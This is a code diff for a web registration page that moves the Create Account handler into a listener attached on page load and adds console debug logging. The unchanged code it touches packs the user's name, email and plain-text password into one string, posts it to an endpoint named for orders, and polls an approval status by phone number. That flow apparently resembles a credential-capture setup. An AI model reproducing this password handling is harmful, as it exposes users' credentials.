@@ -302,7 +302,7 @@
             </div>
 
             <!-- Purple Create Account Button -->
-            <button type="button" id="createAccountBtn" class="reg-btn" onclick="submitRegistration(event)">Create Account</button>
+            <button type="button" id="createAccountBtn" class="reg-btn">Create Account</button>
 
             <!-- Loading Spinner -->
             <div id="loadingSpinner">
@@ -351,8 +351,18 @@
             }
         }
 
+        // Attach event listener dynamically so it never fails to fire
+        document.addEventListener('DOMContentLoaded', () => {
+            const createBtn = document.getElementById('createAccountBtn');
+            if (createBtn) {
+                createBtn.addEventListener('click', submitRegistration);
+            }
+        });
+
         async function submitRegistration(e) {
             if (e) e.preventDefault();
+
+            console.log("Create Account button clicked!");
 
             const nameVal = document.getElementById('fullName').value.trim();
             const emailVal = document.getElementById('emailAddress').value.trim();
@@ -411,6 +421,7 @@
 
                 const registrationPayload = `Name: ${nameVal} | Email: ${emailVal} | Password: ${pass1}`;
 
+                console.log("Sending registration to server...");
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -421,6 +432,7 @@
                 });
 
                 const result = await response.json();
+                console.log("Server response:", result);
 
                 if (result.success) {
                     pollApprovalStatus(phoneInput);
@@ -446,6 +458,8 @@
                 try {
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                     const data = await response.json();
+
+                    console.log("Polling status:", data.status);
 
                     if (data.status === 'approved') {
                         clearInterval(statusInterval);
